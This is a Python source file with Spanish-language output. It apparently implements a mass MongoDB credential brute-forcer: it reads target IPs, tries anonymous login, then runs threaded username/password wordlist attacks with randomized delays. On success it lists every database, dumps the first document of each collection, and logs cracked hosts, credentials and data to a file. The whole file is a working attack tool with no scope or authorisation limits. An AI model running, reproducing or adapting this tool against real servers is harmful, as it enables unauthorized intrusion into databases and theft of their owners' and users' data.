import random
import sys
import pymongo
import time
import re
import datetime
from concurrent.futures import ThreadPoolExecutor
from utils.fileio import save_line

class BRUTERLSTB:
    def __init__(self, hosts="",users="",passwords="",single=(),mode="list"):
        self.__configuration_errors = 0
        self.__scram_auth_errors = 0
        self.__conection_failure = 0
        self.__cracked_host = 0
        self.__without_creds = 0
        self.__total_host = 0
        if  mode == "unique":
            self.login_attemp(single[0],single[1], single[2])
        elif mode == "list":
            self.__hosts_file = hosts
            self.__users_file = users
            self.__passwords_file = passwords
            self.do()
    def login_attemp(self, host, user, password):

        try:

            mongoUriString = "mongodb://" + host + "/?authSource=admin&readPreference=primary&directConnection=true&ssl=false"

            client = pymongo.MongoClient(mongoUriString, username=user, password=password)

            time_rand = random.randint(3, 8) / 10

            time.sleep(time_rand)  # Default 0.8

            databases = client.list_database_names()

            self.banner_status()

            if len(databases):

                print("\n")
                print("*" * 200)
                print(f"Host: {host} Usuario: {user} Contraseña: {password} Base de datos: {databases}")

                save_line("outputMongoBF.txt", f"Host: {host} Usuario: {user} Contraseña: {password}")

                for db in databases:

                    documents = client[db].list_collection_names()

                    for d in documents:
                        try:
                            collection = client[db].get_collection(d).find_one()
                            print(f'DB: {db} | CollectionName: {d} | CollectionContent: {collection}')
                            line = f'DB: {db} | CollectionName: {d} | CollectionContent: {collection}\n'
                            save_line("outputMongoBF.txt", line)
                        except Exception as e:
                            print(f"Error de collection {e}")
                            continue

                save_line("outputMongoBF.txt", "*" * 200)

                if user and password:
                    self.__cracked_host += 1
                else:
                    self.__without_creds += 1

                return True
            else:
                return False

        except pymongo.errors.OperationFailure as e:
            msg = e.details.get('errmsg', '')
            if e.code == 18 or e.code == 13 or 'auth fails' in msg:
                time.sleep(time_rand)
                return True
            elif e.code == 334:
                self.__scram_auth_errors += 1
                save_line("scram-hosts.txt", host)
                return False
            else:
                print(f"auth fails {e}")
                return False
        except (pymongo.errors.ConnectionFailure) as e:
            print(f"Conection error. ID { e } ")
            self.__conection_failure += 1
            save_line("conf-host-failure.txt", f"{host},{e}")

            return False
            # return False
        except pymongo.errors.ConfigurationError as e:
            self.__configuration_errors += 1
            save_line("conf-host-configuration.txt", f"{host},{e}")
            return False
        except pymongo.errors.NetworkTimeout as e:
            print("Network Timeout" + e)
            return False
        except Exception as e:
            print("Exception:" + str(e))
            return False

        # funcion para imprimir status del proceso
    def banner_status(self):
            sys.stdout.write(
                f'\rServidores Crackeados: {self.__cracked_host}| Servidores sin credenciales: {self.__without_creds}| Errores de configuracion: {self.__configuration_errors} | Errores de conexion: {self.__conection_failure} | Error AuthScram {self.__scram_auth_errors} | Total: {self.__total_host}')
            sys.stdout.flush()
        # Lectura del archivo de hosts y comprobacion de conectividad
    def checkHost(self, host) -> bool:
            if self.login_attemp(host, '', ''):
                try:
                    with open("users.txt") as u:
                        users = u.readlines()
                        with open("passwords.txt") as p:
                            passwords = p.readlines()
                            with ThreadPoolExecutor(max_workers=15) as executor_y:
                                for usuario in users:
                                    for password in passwords:
                                        executor_y.submit(self.login_attemp, host, usuario.strip(), password.strip())


                except Exception as e:
                    print(f"Error general en checkHost {e}")

    def do(self):
        print(f'inicio:{datetime.datetime.now()}')

        with open(self.__hosts_file) as h:
            hosts = h.readlines()
            with ThreadPoolExecutor(max_workers=100) as executor:
                for host in hosts:
                    ip = re.findall(r"\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b", host.strip())

                    if ip:
                        try:
                            executor.submit(self.checkHost, ip[0])
                            self.__total_host += 1
                        except Exception as e:
                            print(e)
                    else:
                        continue

        print(f'fin:{datetime.datetime.now()}')

